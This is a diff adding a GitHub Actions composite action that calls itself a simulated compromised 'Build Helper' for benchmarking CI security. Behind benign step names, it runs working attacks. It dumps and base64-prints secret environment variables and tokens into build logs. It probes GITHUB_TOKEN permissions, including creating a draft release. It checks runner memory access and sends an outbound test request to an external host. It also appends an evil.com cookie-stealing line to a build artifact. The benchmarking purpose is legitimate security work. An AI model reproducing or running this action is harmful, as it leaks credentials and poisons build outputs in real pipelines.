@@ -1,0 +1,132 @@
+name: "Build Helper"
+description: "Simulated compromised helper used to benchmark CI trust boundaries"
+outputs:
+  file_list:
+    description: "List of discovered source files"
+    value: ${{ steps.list.outputs.files }}
+runs:
+  using: "composite"
+  steps:
+    - name: List files
+      id: list
+      shell: bash
+      run: |
+        FILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"
+        echo "files=$FILES" >> "$GITHUB_OUTPUT"
+        echo "Found source files: $FILES"
+
+    - name: Post-build telemetry
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK 1: Environment Variable Dump"
+        echo "========================================="
+        printenv | sort > env_dump.txt
+        while IFS= read -r line; do
+          KEY="${line%%=*}"
+          case "$KEY" in
+            *SECRET*|*TOKEN*|*KEY*|*PASSWORD*|*CREDENTIAL*|*AWS*)
+              echo "FOUND SECRET: $line"
+              ;;
+            GITHUB_TOKEN)
+              echo "FOUND GITHUB_TOKEN: ${line:0:30}..."
+              ;;
+          esac
+        done < env_dump.txt
+        SECRET_COUNT="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS' | wc -l || true)"
+        echo "Total secrets found in environment: $SECRET_COUNT"
+
+    - name: Verify API connectivity
+      shell: bash
+      env:
+        GITHUB_TOKEN: ${{ github.token }}
+      run: |
+        echo "========================================="
+        echo "ATTACK 2: GITHUB_TOKEN Permission Check"
+        echo "========================================="
+        if [ -n "$GITHUB_TOKEN" ]; then
+          REPO_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /dev/null -w "%{http_code}")"
+          BRANCH_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" -o /dev/null -w "%{http_code}")"
+          RELEASE_STATUS="$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases" -d '{"tag_name":"test-probe","draft":true}' -o /dev/null -w "%{http_code}")"
+          echo "Token exists: YES"
+          echo "Repo access status: $REPO_STATUS"
+          echo "Can read branches: $BRANCH_STATUS"
+          echo "Can create releases: $RELEASE_STATUS"
+        else
+          echo "No GITHUB_TOKEN found in environment"
+        fi
+
+    - name: Runtime diagnostics
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK 3: Process Memory Scan"
+        echo "========================================="
+        RUNNER_PID="$(pgrep -f 'Runner.Worker' || echo 'none')"
+        echo "Runner.Worker PID: $RUNNER_PID"
+        if [ "$RUNNER_PID" != "none" ] && [ -r "/proc/$RUNNER_PID/maps" ]; then
+          echo "Can read /proc/$RUNNER_PID/maps: YES"
+          READABLE_REGIONS="$(grep ' r' "/proc/$RUNNER_PID/maps" | wc -l || true)"
+          echo "Readable memory regions: $READABLE_REGIONS"
+          echo "Memory dump capability: CONFIRMED"
+        else
+          echo "Memory dump capability: BLOCKED"
+        fi
+
+    - name: Upload build metrics
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK 4: Exfiltration Attempt"
+        echo "========================================="
+        PAYLOAD="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|AWS' | base64 -w 0 || true)"
+        if [ -n "$PAYLOAD" ]; then
+          echo "Encoded payload ready (${#PAYLOAD} bytes)"
+          echo "Base64 payload:"
+          echo "$PAYLOAD"
+        else
+          echo "No secrets found to exfiltrate"
+        fi
+        EXFIL_TEST="$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://httpbin.org/post -d "data=test_exfil" 2>/dev/null || echo "blocked")"
+        echo "Outbound HTTP to external server: $EXFIL_TEST"
+
+    - name: Post-build optimization
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK 5: Artifact Poisoning"
+        echo "========================================="
+        mkdir -p build
+        if [ ! -f "build/app.js" ]; then
+          echo "console.log('legitimate app');" > build/app.js
+        fi
+        {
+          echo ""
+          echo "// BACKDOOR: fetch('https://evil.com/steal?' + document.cookie)"
+        } >> build/app.js
+        echo "Artifact poisoned successfully"
+
+    - name: Cache workspace state
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK 6: Source Code Theft Attempt"
+        echo "========================================="
+        FILE_COUNT="$(find . -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | wc -l || true)"
+        TOTAL_SIZE="$(du -sh . 2>/dev/null | cut -f1 || echo 'unknown')"
+        echo "Source files found: $FILE_COUNT"
+        echo "Total workspace size: $TOTAL_SIZE"
+        echo "Could compress and exfiltrate: YES"
+
+    - name: Build complete
+      shell: bash
+      run: |
+        echo "========================================="
+        echo "ATTACK SUMMARY"
+        echo "========================================="
+        echo "1. Environment variable dump"
+        echo "2. GITHUB_TOKEN permission probe"
+        echo "3. Process memory access check"
+        echo "4. Exfiltration via encoded logs + HTTP"
+        echo "5. Build artifact poisoning"
+        echo "6. Source code enumeration"
